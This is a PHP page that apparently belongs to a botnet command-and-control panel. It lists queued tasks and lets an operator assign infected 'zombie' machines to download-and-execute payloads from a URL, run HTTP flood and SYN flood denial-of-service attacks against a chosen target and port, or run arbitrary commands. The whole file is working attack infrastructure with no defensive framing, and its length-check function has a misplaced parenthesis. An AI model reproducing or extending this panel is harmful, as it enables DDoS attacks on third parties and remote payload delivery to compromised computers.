<?php require_once('inc/session.php'); require_once('inc/body.php'); require_once('inc/config.php'); require_once('funcs/safe.php'); ?>

<script language="javascript">
$(document).ready(function() {
    $('a[rel*=facebox]').facebox();
})
</script>

<h3><img src="img/icons/tasks.png" />&nbsp;Create Tasks</h3>

<table style="width: 100%;">
<tr>
	<th class="table" id="mittel"><img src="img/icons/id.png" />&nbsp;ID</th>
	<th class="table" id="groesser"><img src="img/icons/cmd.png" />&nbsp;Command</th>
	<th class="table" id="groesser"><img src="img/icons/clock_tasks.png" />&nbsp;Date / Time</th>
	<th class="table" id="kleiner"><img src="img/icons/bots.png" />&nbsp;Bots</th>
	<th class="table" id="mittel"><img src="img/icons/done.png" />&nbsp;Done</th>
	<th class="table" id="mittel"><img src="img/icons/del_th.png" />&nbsp;Del</th>
</tr>
<?php
$q1 = mysql_query("SELECT * FROM tasks");
while($row = mysql_fetch_array($q1))
 {
   echo '<tr>
			<td id="kleiner">'.safe_xss($row['id']).'</td>
			<td id="groesser">'.checklaenge(safe_xss($row['command'])).'</td>
			<td id="groesser">'.safe_xss($row['time']).'</td>
			<td id="mittel">'.safe_xss($row['bots']).'</td>
			<td id="kleiner">'.safe_xss($row['done']).'</td>
			<td id="kleiner"><a href="?del='.safe_xss($row['command']).'"><img src="img/icons/del.png" /></a></td>
		</tr>';
 }
 
echo '</table>
	  <form action="mytasks.php" method="post">
		<p><input type="submit" name="delalltasks" class="button" value="Delete all tasks" />
		<a href="facebox/loader.php" rel="facebox"><button class="button">Add task (Loader)</button></a>
		<a href="facebox/http.php" rel="facebox"><button class="button">Add task (Httpflood)</button></a>
		<a href="facebox/syn.php" rel="facebox"><button class="button">Add task (Synflood)</button></a>
		<a href="facebox/other.php" rel="facebox"><button class="button">Add task (Other)</button></a></p>
	  </form>';

//Loader
if(isset($_POST['addtask_loads'])){
	//For insert
	$command = safe_xss($_POST['url']);
	$zombies = safe_xss($_POST['loads']);
	$date	 = safe_xss($_POST['datetime']);
	
	//Command
	$command_end = 'dlex*'.safe_xss($command).'!';

	
	mysql_query("INSERT INTO tasks 
	  (command, time, bots) VALUES
	  ('".safe_sql($command_end)."', '".safe_sql($date)."', '".safe_sql($zombies)."')");
	  
	echo '<meta http-equiv="refresh" content="0; URL=mytasks.php">';
}	  
//Loader

//DDoS Http
if(isset($_POST['addtask_http'])){
	//For insert
	$url 	  = safe_xss($_POST['url']);
	$interval = safe_xss($_POST['interval']);
	$threads  = safe_xss($_POST['threads']);
	$zombies  = safe_xss($_POST['bots']);
	$date	  = safe_xss($_POST['datetime']);
	
	//Command
	$command_end = 'http*'.safe_xss($url).'*'.safe_xss($interval).'*'.safe_xss($threads).'!';

	
	mysql_query("INSERT INTO tasks 
	  (command, time, bots) VALUES
	  ('".safe_sql($command_end)."', '".safe_sql($date)."', '".safe_sql($zombies)."')");
	  
	echo '<meta http-equiv="refresh" content="0; URL=mytasks.php">';
}	  
//DDoS

//DDoS Syn
if(isset($_POST['addtask_syn'])){
	//For insert
	$url 	  = safe_xss($_POST['url']);
	$interval = safe_xss($_POST['interval']);
	$threads  = safe_xss($_POST['threads']);
	$port     = safe_xss($_POST['port']);
	$sockets  = safe_xss($_POST['sockets']);
	$zombies  = safe_xss($_POST['bots']);
	$date	  = safe_xss($_POST['datetime']);
	
	//Command
	$command_end = 'syn*'.safe_xss($url).'*'.safe_xss($port).'*'.safe_xss($threads).'*'.safe_xss($sockets).'!';

	
	mysql_query("INSERT INTO tasks 
	  (command, time, bots) VALUES
	  ('".safe_sql($command_end)."', '".safe_sql($date)."', '".safe_sql($zombies)."')");
	  
	echo '<meta http-equiv="refresh" content="0; URL=mytasks.php">';
}	  
//DDoS

//other
if(isset($_POST['addtask_other'])){
	//For insert
	$zombies  = safe_xss($_POST['bots']);
	$date	  = safe_xss($_POST['datetime']);
	$command  = safe_xss($_POST['command']);
	
	//Command
	$command_end = $command.'!';
	
	mysql_query("INSERT INTO tasks 
	  (command, time, bots) VALUES
	  ('".safe_sql($command_end)."', '".safe_sql($date)."', '".safe_sql($zombies)."')");
	  
	echo '<meta http-equiv="refresh" content="0; URL=mytasks.php">';
}	  
//DDoS

//Delete
if(isset($_GET['del'])){
	$del_command = safe_xss($_GET['del']);	
	mysql_query("DELETE FROM tasks WHERE command LIKE '".safe_sql($del_command)."'");
	mysql_query("DELETE FROM tasks_done WHERE command LIKE '".safe_sql($del_command)."'");
	echo '<meta http-equiv="refresh" content="0; URL=mytasks.php">';
}

//Delete Tasks
if(isset($_POST['delalltasks'])){
	mysql_query("DELETE FROM tasks");
	mysql_query("DELETE FROM tasks_done");
	echo '<meta http-equiv="refresh" content="0; URL=mytasks.php">';
}

function checklaenge($a){
	if(strlen($a > 60)){
		return safe_xss(substr($a,0,60)).'...';
	}else{
		return $a;
	}
}

require_once('inc/footer.php');
?>